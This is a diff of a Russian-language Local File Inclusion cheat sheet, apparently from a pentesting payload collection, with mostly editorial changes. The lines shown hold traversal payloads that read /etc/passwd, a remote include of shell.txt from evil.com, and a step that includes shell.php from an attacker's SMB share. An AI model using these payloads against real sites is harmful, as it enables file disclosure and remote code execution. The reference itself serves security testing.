@@ -1,17 +1,3 @@
-
-PHP
-index.php = index.php~ 
-deserialization.php.bak
-deserialization.php.backup
-deserialization.php.tmp
-deserialization.php.old
-deserialization.php.1
-deserialization.php.save
-.deserialization.php.swp    # Vim swap file
-deserialization.php.swp
-.deserialization.php.swo
-deserialization.php~        # Backup copy
-
 * [Инструменты](#Инструменты)
 * [Локальное включение файлов (LFI)](#Локальное-включение-файлов-(LFI))
     * [Null Byte](#Null-Byte)
@@ -94,10 +80,10 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 
 ```text
 
-http://example.com/index.php?page=../../../etc/passwd............[ДОБАВЬТЕ БОЛЬШЕ]
-http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ДОБАВЬТЕ БОЛЬШЕ]
-http://example.com/index.php?page=../../../etc/passwd/./././././.[ДОБАВЬТЕ БОЛЬШЕ] 
-http://example.com/index.php?page=../../../[ДОБАВЬТЕ БОЛЬШЕ]../../../../etc/passwd
+http://example.com/index.php?page=../../../etc/passwd............[ДОБАВЬ БОЛЬШЕ]
+http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ДОБАВЬ БОЛЬШЕ]
+http://example.com/index.php?page=../../../etc/passwd/./././././.[ДОБАВЬ БОЛЬШЕ] 
+http://example.com/index.php?page=../../../[ДОБАВЬ БОЛЬШЕ]../../../../etc/passwd
 ```
 
 # Обход фильтров
@@ -147,7 +133,7 @@ http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 
 1. Создайте общедоступную общую папку
 2. Напишите PHP код внутри файла: shell.php
-3. Включите его: http://example.com/index.php?page=\\10.0.0.1\share\shell.php
+3. Включите его: ```http://example.com/index.php?page=\\10.0.0.1\share\shell.php```
 
 # URL
 
